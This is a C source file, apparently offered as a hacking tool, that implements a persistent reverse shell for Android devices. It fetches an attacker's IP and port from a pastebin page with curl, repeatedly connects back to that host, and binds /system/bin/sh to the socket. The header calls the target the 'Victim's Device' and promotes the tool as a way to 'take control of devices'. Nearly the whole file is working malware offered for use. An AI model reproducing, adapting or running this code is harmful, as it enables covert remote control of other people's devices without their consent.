/***************************************************************************
██████╗  █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗        @Kumar Raja
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║
██╔══██╗██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║
██║  ██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
                                                   
This Program allows you to create Revershell or Life Time.

Advantages: Allows to take take control of devices if you run this as background
Limitation: It won't Work if the device is restarted.

Usage:  Provide IP & Port details with pipe Separated in any site. 
    I Prefered pastebin . After That replace the url below with
    your url

Curl Must installed on Victim's Device or Else Please Watch My Vidoes or Below
Instructions to setup Curl Without any Permissions

If have Problem wih Curl Please use wget

any Queries Email-Me At - kisstechno@gmail.com
***************************************************************************/


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int getipport(); 
int rshell(char *IP, int PORT){ 
    int socket_info;
    int connectie;
    int pid;
    struct sockaddr_in mysocket;


    while(1){

	socket_info = socket(AF_INET, SOCK_STREAM, 0);
    mysocket.sin_family = AF_INET;
    mysocket.sin_port = htons(PORT);
    mysocket.sin_addr.s_addr = inet_addr(IP); 

    connectie = connect(socket_info, (struct sockaddr *)&mysocket, sizeof(struct sockaddr));
	while(connectie < 0){
		printf("IP: %s PORT %d\n",IP,PORT);
//		printf("%d Connecting to IP.\n",IP);
		sleep(5);
		getipport();
		//connectie = connect(socket_info, (struct sockaddr *)&mysocket, sizeof(struct sockaddr));
    }
    connectie = write(socket_info,"\033[1;32m Connected Successfully :) :) :)\n\033[0m",40);
    
//    printf("Connected Made.\n");
    
    pid = fork();
    if(pid > 0){
		
		wait(NULL);
	}
	if(pid == 0){
		
		dup2(socket_info,0); // input
		dup2(socket_info,1); // output
		dup2(socket_info,2); // errors
		execl("/system/bin/sh","> ");
	}
    
// printf("Running Again\n");   
}
	return 0;
}

int getipport(){
system(" export LD_LIBRARY_PATH=/data/local/tmp/lib64; /data/local/tmp/curl -s 'https://pastebin.com/1MZ1Tpxc' | grep paste_code | cut -d'>' -f2 | cut -d'<' -f1> /data/local/tmp/ipd.txt ");
FILE *f;
char c[1000];
f=fopen("/data/local/tmp/ipd.txt","rt");
if(f == NULL)	{
	printf("open ip file problem");
	exit(1);
		}
fscanf(f,"%[^\n]", c);
fclose(f);

char *line = strdup(c);
//char *cstring=malloc(sizeof(char) * strlen(line));
//strcpy(cstring,line);
//int charcount = sizeof cstring - 1;
//printf("count=%dchar=%sraja",charcount,cstring);
char finds='|';
int mystatus=0;
for(int i=0;i<=30;i++){
	char k=c[i];
	if(k==finds)
	{
	mystatus=1;
	}
	
}
if(mystatus==0){ sleep(5);getipport();}
char *fir = strtok(line, "|");
char *sec = strtok(NULL, "|");
char IP[20];
strcpy(IP,fir);
int PORT=atoi(sec);
//printf("Fetching the IP\n");
//char IP[]="192.168.43.1";
//int PORT=4444;
//printf("IP: %s PORT %d\n",IP,PORT);
rshell(IP,PORT);
return 1;
}

// ----------------------------------------------------------------------------------------
void usage() { 
printf("██████╗  █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗\n"
"██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗\n"
"██████╔╝███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║\n"
"██╔══██╗██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║\n"
"██║  ██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝\n"
"╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ \n"
"                                         \033[1;32m--kumar Raja\033[0m      \n"
"\n");
printf("Usage:  Provide IP & Port details with pipe Separated in any site.\n        I Prefered pastebin . After That replace the url inthe Source Code with your url\n        Any Queries Email-Me At - kisstechno@gmail.com\n");
exit(EXIT_FAILURE);
}

int main( int argc, char *argv[] ){
if (argv[1])
{
usage();
}
else
{
getipport();
}
}

